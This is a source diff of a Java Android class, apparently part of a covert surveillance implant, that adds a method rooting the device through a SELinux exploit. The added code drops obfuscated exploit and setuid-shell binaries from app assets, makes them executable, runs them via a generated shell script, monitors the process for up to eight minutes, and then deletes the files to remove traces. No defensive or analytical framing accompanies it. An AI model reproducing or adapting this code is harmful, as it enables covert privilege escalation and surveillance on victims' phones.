@@ -301,7 +301,7 @@ public class Root {
 			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
 
 			// Create the rooting script
-			String pack = Status.self().getAppContext().getPackageName();
+			String pack = Status.getAppContext().getPackageName();
 
 			String script = M.e("#!/system/bin/sh") + "\n"
 					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";
@@ -333,6 +333,106 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
 				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+	
+	static public boolean selinuxExploit() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String localExploit = M.e("vs"); // selinux_exploit
+		final String selinuxSuidext = M.e("qj"); // selinux_suidext
+		final String suidext = M.e("ss"); // suidext (standard)
+		
+		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
+		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
+		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext (standard)
+
+		try {
+			fileWrite(localExploit, streamExpl, Cfg.RNDDB);
+			fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
+			fileWrite(suidext, streamSuidext, Cfg.RNDDB);
+
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+
+			// Run SELinux exploit
+			// - argv[1]: path assoluto alla nuova shell
+		    // - argv[2]: path assoluto alla vecchia shell
+			String pack = Status.getAppContext().getPackageName();
+
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/vs /data/data/%s/files/qj /data/data/%s/files/ss"), pack, pack, pack) + "\n";
+
+			if (Root.createScript("fig", script) == true) {
+				Process runScript = Runtime.getRuntime().exec(path + "/fig");
+
+				// Non serve
+				runScript.waitFor();
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(selinuxExploit): " + runScript.getClass());
+				}
+			
+				// Monitor exploit execution
+				boolean finished = true;
+				long curTime = System.currentTimeMillis();
+				
+				while (System.currentTimeMillis() < curTime + (1000 * 60 * 8)) {
+					ExecuteResult result = Execute.execute("ps");
+					
+					for (String s : result.stdout) {
+					    if (s.contains("/files/vs")) {
+					    	if (Cfg.DEBUG) {
+								Check.log(TAG + "(selinuxExploit): exploitation in progress");
+							}
+					    	
+					    	finished = false;
+					    	break;
+					    }
+					}
+					
+					if (finished || Root.isRootShellInstalled()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(selinuxExploit): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+						}
+						
+						break;
+					}
+					
+					
+					finished = true;
+					Utils.sleep(5000);
+				}
+
+				Root.removeScript("fig");
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (selinuxExploit), cannot create script");
+				}
+			}
+
+			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+			file.delete();
+
+			file = new File(Status.getAppContext().getFilesDir(), selinuxSuidext);
+			file.delete();
+
+			file = new File(Status.getAppContext().getFilesDir(), suidext);
+			file.delete();
+			
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (selinuxExploit): Exception"); //$NON-NLS-1$
 			}
 
 			return false;
@@ -431,6 +531,12 @@ public class Root {
 			}
 		}
 
+		if (Status.haveRoot()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
+			}
+		}
+		
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
 	}
